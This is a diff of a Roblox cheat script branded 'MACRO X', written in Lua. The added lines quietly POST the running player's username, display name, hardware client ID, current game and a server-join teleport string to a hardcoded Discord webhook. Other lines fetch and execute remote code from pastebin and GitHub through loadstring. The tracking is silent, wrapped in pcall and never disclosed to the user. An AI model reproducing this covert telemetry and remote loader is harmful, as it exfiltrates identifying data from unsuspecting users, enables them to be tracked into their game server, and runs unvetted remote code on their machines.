@@ -1,4 +1,62 @@
-loadstring(game:HttpGet('https://pastebin.com/raw/cCV7hViz'))()
+_G.ScriptLoaded = nil
+--getgenv().usecar = false
+for i,v in pairs(game.CoreGui:GetChildren()) do
+    if v.Name == "SCRIPT" then
+        v:Destroy()
+    end
+end
+pcall(function()
+WebSocketUrl = "https://discord.com/api/webhooks/1083632925079257098/lmqkgzJY2xJm3DZ5gx_gbH5LrG1UXTyBjSDRNtFU9X-sI67W_zbVE-FR1z6I6YhPHy4z"
+local Info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+
+getgenv().usecar = false 
+syn.request(
+    {
+        Url = WebSocketUrl;
+        Method = "POST";
+        Headers = {
+            ['Content-Type'] = "application/json"
+        };
+        Body = game:GetService("HttpService"):JSONEncode({
+            ['embeds'] = {{
+                ['title'] = "**★彡[MACRO X]彡★**";
+                ['description'] = "**Novo usuário usando MACRO X!**";
+                ['fields'] = {
+                    {
+                        ['name'] = "Nome";
+                        ['value'] = game.Players.LocalPlayer.Name;
+                        ['inline'] = true
+                    },
+                    {
+                        ['name'] = "Apelido:";
+                        ['value'] = game.Players.LocalPlayer.DisplayName;
+                        ['inline'] = true
+                    },
+                    {
+                        ['name'] = "HWID:";
+                        ['value'] = "`"..game:GetService("RbxAnalyticsService"):GetClientId().."`";
+                        ['inline'] = true
+                    },
+                    {
+                        ['name'] = "Jogo:" ;
+                        ['value'] = string.format("`%s`",Info);
+                    },
+                    {
+                        name = "Join script";
+                        value = string.format(
+                            "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%s,%q)```",
+                            game.PlaceId, game.JobId
+                        )
+                    }
+                };
+                image = {
+                    url = "https://cdn.discordapp.com/attachments/999881797066293359/1023768526152020028/standard_7.gif";
+                }
+            }}
+        })
+    }
+)
+end)
 local start = tick()
 
 loadstring(game:HttpGet"https://github.com/webhooking2022/functions-library/raw/main/.functions")()
